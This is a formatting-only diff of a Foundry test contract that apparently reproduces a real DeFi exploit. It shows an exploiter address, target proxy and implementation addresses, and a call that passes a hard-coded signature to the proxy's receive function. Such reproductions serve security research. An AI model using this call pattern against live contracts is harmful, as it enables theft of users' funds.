@@ -16,6 +16,7 @@ struct Signature {
 // }
 
 contract ContractTest is Test {
+
     address exploiter = 0xEda5066780dE29D00dfb54581A707ef6F52D8113;
     address proxy = 0x089165ac9a7Bf61833Da86268F34A01652543466;
     address impl = 0xc5185d2c68aAa7c5f0921948f8135d01510D647F;
@@ -34,7 +35,7 @@ contract ContractTest is Test {
             s: 0x39884d4ef7e88e9b70b0135fca3dd2a97e806ead11e38aa6e75f550724962910
         });
 
-        (bool success, ) = proxy.call(
+        (bool success,) = proxy.call(
             abi.encodeWithSignature(
                 "receive(uint256,address,uint256,uint256, Signature[])",
                 1,
@@ -48,4 +49,5 @@ contract ContractTest is Test {
     }
 
     receive() external payable {}
+
 }
